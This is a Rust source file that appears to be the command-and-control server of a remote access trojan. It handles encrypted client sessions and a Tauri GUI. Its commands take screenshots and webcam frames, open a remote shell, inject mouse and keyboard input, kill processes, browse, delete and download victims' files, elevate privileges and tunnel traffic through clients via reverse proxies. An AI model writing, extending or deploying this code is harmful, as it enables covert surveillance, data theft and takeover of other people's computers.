use std::collections::HashMap;
use tokio::sync::mpsc::{Receiver, Sender};
use std::net::SocketAddr;

use std::sync::{ Arc, Mutex };
use tauri::{ AppHandle, Manager };

use common::packets::ClientInfo;

use rand::rngs::OsRng;
use rand::Rng;
use rsa::{pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
use base64::{engine::general_purpose, Engine as _};

use common::packets::*;

use anyhow::{Context, Result};
use crate::commands::*;
use common::{ENC_TOK_LEN, RSA_BITS};

use crate::utils::logger::Logger;

pub struct ServerWrapper {
    receiver: Receiver<ServerCommand>,
    txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>>,
    connected_users: HashMap<std::net::SocketAddr, ClientInfo>,
    priv_key: RsaPrivateKey,
    pub_key: RsaPublicKey,
    tauri_handle: Option<Arc<Mutex<AppHandle>>>,
    reverse_proxy_tasks: HashMap<std::net::SocketAddr, tokio::task::JoinHandle<()>>,
    log_events: Logger,
}

impl ServerWrapper {
    pub async fn spawn(receiver: Receiver<ServerCommand>) -> Result<()> {
        let txs: HashMap<std::net::SocketAddr, Sender<ClientCommand>> = HashMap::new();
        let connected_users: HashMap<std::net::SocketAddr, ClientInfo> = HashMap::new();
        let mut rng = OsRng;
        let priv_key =
            RsaPrivateKey::new(&mut rng, RSA_BITS).with_context(|| "Failed to generate a key.")?;
        let pub_key = RsaPublicKey::from(&priv_key);

        let s = Self {
            receiver,
            txs,
            connected_users,
            priv_key,
            pub_key,
            tauri_handle: None,
            reverse_proxy_tasks: HashMap::new(),
            log_events: Logger::new(),
        };

        s.channel_loop().await;

        Ok(())
    }
    
    async fn emit_client_status(&self, client_info: &ClientInfo, status: &str) {
        let payload = serde_json::json!(client_info);
        self.emit_serde_payload(status, payload).await;
    }

    async fn emit_serde_payload(&self, event: &str, payload: serde_json::Value) {
        if let Some(handle) = &self.tauri_handle {
            handle.lock().unwrap().emit_all(event, payload).unwrap_or_else(|e| println!("Failed to emit payload event: {}", e));
        } else {
            println!("Cannot send payload event: Tauri handle not set");
        }
    }

    async fn send_client_packet(&self, addr: &SocketAddr, packet: ClientboundPacket) {
        if let Some(tx) = self.txs.get(&addr) {
            tx.send(ClientCommand::Write(packet.clone()))
                .await
                .unwrap_or_else(|e| println!("Failed to send packet {:?}: {}", packet.get_type(), e));
        }
    }

    async fn channel_loop(mut self) {
        loop {
            use crate::commands::ServerCommand::*;

            let p = match self.receiver.recv().await {
                Some(p) => p,
                None => break,
            };

            match p {
                Log(log) => {
                    self.log_events.log_once(log).await;
                }
                CloseClientSessions() => {
                    for (addr, tx) in self.txs.iter_mut() {
                        tx.send(ClientCommand::Close).await.unwrap();
                        self.reverse_proxy_tasks.remove(&addr);
                    }
                    self.txs.clear();
                    self.connected_users.clear();
                    self.reverse_proxy_tasks.clear();
                    self.log_events.log("server_stopped", "Server stopped!").await;
                }
                EncryptionRequest(tx, otx) => {
                    let mut token = [0u8; ENC_TOK_LEN];
                    OsRng.fill(&mut token);
                    tx.send(ClientCommand::Write(
                        ClientboundPacket::EncryptionResponse(
                            self.pub_key.to_public_key_der().unwrap().as_ref().to_vec(),
                            token.to_vec(),
                        ),
                    ))
                    .await
                    .unwrap();
                    otx.send(token.to_vec()).unwrap();
                }
                EncryptionConfirm(tx, otx, enc_s, enc_t, exp_t) => {
                    let t = {
                        let padding = PaddingScheme::new_pkcs1v15_encrypt();
                        self.priv_key
                            .decrypt(padding, &enc_t)
                            .expect("Failed to decrypt.")
                    };
                    if t != exp_t {
                        eprintln!("Encryption handshake failed!");
                        tx.send(ClientCommand::Close).await.ok();
                        otx.send(Err(())).unwrap();
                    } else {
                        let s = {
                            let padding = PaddingScheme::new_pkcs1v15_encrypt();
                            self.priv_key
                                .decrypt(padding, &enc_s)
                                .expect("Failed to decrypt.")
                        };
                        otx.send(Ok(s.clone())).unwrap();
                        tx.send(ClientCommand::SetSecret(Some(s.clone())))
                            .await
                            .unwrap();
                        tx.send(ClientCommand::Write(ClientboundPacket::EncryptionAck))
                            .await
                            .unwrap();

                        // After successful encryption, request client info
                        tx.send(ClientCommand::Write(ClientboundPacket::InitClient))
                            .await
                            .unwrap();
                    }
                }
                RegisterClient(tx, addr, mut client_info) => {                    // Store the client's connection sender
                    self.txs.insert(addr, tx);
                    client_info.uuidv4 = Some(uuid::Uuid::new_v4().to_string());
                    client_info.addr = Some(addr.to_string());

                    self.connected_users.insert(addr, client_info.clone());
                    
                    let message = format!("Client [{}] {} connected!", addr, client_info.username);

                    self.log_events.log("client_connected", &message).await;
                    self.emit_client_status(&client_info, "client_connected").await;
                }
                VisitWebsite(addr, visit_data) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Visit Website on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::VisitWebsite(visit_data)).await;
                }
                ShowMessageBox(addr, message_box_data) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Show MessageBox on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::ShowMessageBox(message_box_data)).await;
                }
                ElevateClient(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Elevate Client on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::ElevateClient).await;
                }
                ScreenshotData(addr, screenshot_data) => { 
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Received screenshot from client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_rcvd", &message).await;

                    let base64_img = general_purpose::STANDARD.encode(&screenshot_data);
                    let data_url = format!("data:image/jpeg;base64,{}", base64_img);
                    
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "data": data_url
                    });
                    
                    self.emit_serde_payload("client_screenshot", payload).await;
                }
                TakeScreenshot(addr, display) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Take Screenshot on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::ScreenshotDisplay(display)).await;
                }
                GetProcessList(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Get Process List on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::GetProcessList).await;
                }
                ProcessList(addr, process_list) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Received process list from client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_rcvd", &message).await;

                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "processes": process_list.processes.clone()
                    });

                    self.emit_serde_payload("process_list", payload).await;
                }
                KillProcess(addr, process) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Kill Process on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::KillProcess(process)).await;
                }
                StartShell(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Start Shell on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::StartShell).await;
                }
                ExitShell(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Exit Shell on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::ExitShell).await;
                }
                ShellCommand(addr, command) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Shell Command on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::ShellCommand(command)).await;
                }
                ShellOutput(addr, output) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Received shell output from client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_rcvd", &message).await;

                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "shell_output": output.clone()
                    });

                    self.emit_serde_payload("client_shellout", payload).await;
                }
                StartRemoteDesktop(addr, config) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Start Remote Desktop on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::StartRemoteDesktop(config)).await;
                }
                StopRemoteDesktop(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Stop Remote Desktop on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    let reset_input: KeyboardInputData = KeyboardInputData {
                        key_code: 0,
                        character: "".to_string(),
                        is_keydown: false,
                        shift_pressed: false,
                        ctrl_pressed: false,
                        caps_lock: false
                    };
                    self.send_client_packet(&addr, ClientboundPacket::KeyboardInput(reset_input)).await;
                    self.send_client_packet(&addr, ClientboundPacket::StopRemoteDesktop).await;

                }  
                MouseClick(addr, click_data) => {
                    self.send_client_packet(&addr, ClientboundPacket::MouseClick(click_data)).await;
                }
                KeyboardInput(addr, input_data) => {
                    self.send_client_packet(&addr, ClientboundPacket::KeyboardInput(input_data)).await;
                }
                RemoteDesktopFrame(addr, frame) => {
                    let base64_img = general_purpose::STANDARD.encode(&frame.data);

                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "timestamp": frame.timestamp,
                        "display": frame.display,
                        "data": base64_img
                    });
                    
                    self.emit_serde_payload("remote_desktop_frame", payload).await;
                }
                GetClients(resp) => {
                    let clients = self.connected_users.values().cloned().collect();
                    resp.send(clients).ok();
                }
                GetClient(addr, resp) => {
                   let client = self.connected_users.get(&addr).cloned();
                   resp.send(client).ok();
                }
                SetTauriHandle(handle) => {
                    self.tauri_handle = Some(Arc::new(Mutex::new(handle)));
                    self.log_events.tauri_handle = Some(self.tauri_handle.clone().unwrap());
                }
                ClientDisconnected(addr) => {
                    if let Some(client) = self.connected_users.get(&addr) {
                        let message = format!("Client [{}] [{}] disconnected", addr, client.username);
                        self.log_events.log("client_disconnected", &message).await;
                        self.emit_client_status(&client, "client_disconnected").await;
                    }

                    self.txs.remove(&addr);
                    self.reverse_proxy_tasks.remove(&addr);
                    self.connected_users.remove(&addr);
                }
                DisconnectClient(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::Disconnect).await;
                }
                ReconnectClient(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::Reconnect).await;
                }
                ManageSystem(addr, command) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run [{}] on client [{}] [{}]", command, addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::ManageSystem(command)).await;
                }

                PreviousDir(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::PreviousDir).await;
                }

                ViewDir(addr, path) => {
                    self.send_client_packet(&addr, ClientboundPacket::ViewDir(path)).await;
                }

                AvailableDisks(addr) => {
                    self.send_client_packet(&addr, ClientboundPacket::AvailableDisks).await;
                }

                RemoveDir(addr, path) => {
                    self.send_client_packet(&addr, ClientboundPacket::RemoveDir(path)).await;
                }

                RemoveFile(addr, path) => {
                    self.send_client_packet(&addr, ClientboundPacket::RemoveFile(path)).await;
                }

                DownloadFile(addr, path) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Download File on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::DownloadFile(path)).await;
                }

                DisksResult(addr, disks) => {
                    let mut files = Vec::new();
                    for disk in disks {
                        files
                        .push(File {
                            file_type: "dir".to_string(),
                            name: format!("{}:\\", disk),
                        });
                    } 

                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "files": files
                    });
                    
                    self.emit_serde_payload("files_result", payload).await;
                }
                
                FileList(addr, files) => {
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "files": files
                    });
                    
                    self.emit_serde_payload("files_result", payload).await;
                }
                
                CurrentFolder(addr, path) => {
                    let payload = serde_json::json!({
                        "addr": addr.to_string(),
                        "path": path
                    });
                    
                    self.emit_serde_payload("current_folder", payload).await;
                }
                
                DownloadFileResult(addr, file_data) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message: String = format!("Downloaded file from client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_rcvd", &message).await;

                    let _ = std::fs::write(file_data.name, file_data.data);
                }

                StartReverseProxy(addr, port, local_port) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Start Reverse Proxy on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::StartReverseProxy(port.clone())).await;

                    let task = crate::utils::reverse_proxy::start_reverse_proxy(port, local_port).await;
                    if let Some(task) = task {
                        self.reverse_proxy_tasks.insert(addr, task);
                    }
                }
                StopReverseProxy(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Stop Reverse Proxy on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::StopReverseProxy).await;

                    if let Some(task) = self.reverse_proxy_tasks.get(&addr) {
                        task.abort();
                    }

                    self.reverse_proxy_tasks.remove(&addr);
                }
                RequestWebcam(addr) => {
                    let client = self.connected_users.get(&addr).unwrap();
                    let message = format!("Run Request Webcam on client [{}] [{}]", addr, client.username);

                    self.log_events.log("cmd_sent", &message).await;

                    self.send_client_packet(&addr, ClientboundPacket::RequestWebcam).await;
                }
                WebcamResult(addr, frame) => {
                    // Process webcam data using the dedicated webcam module
                    match crate::utils::webcam::process_webcam_frame(frame) {
                        Ok(jpeg_data) => {
                            // Create data URL with the JPEG data
                            let base64_img = general_purpose::STANDARD.encode(&jpeg_data);
                            let data_url = format!("data:image/jpeg;base64,{}", base64_img);
                            
                            let payload = serde_json::json!({
                                "addr": addr.to_string(),
                                "data": data_url
                            });
                            
                            self.emit_serde_payload("webcam_result", payload).await;
                        },
                        Err(_e) => {
                        }
                    }
                }
            }
        }
    }
}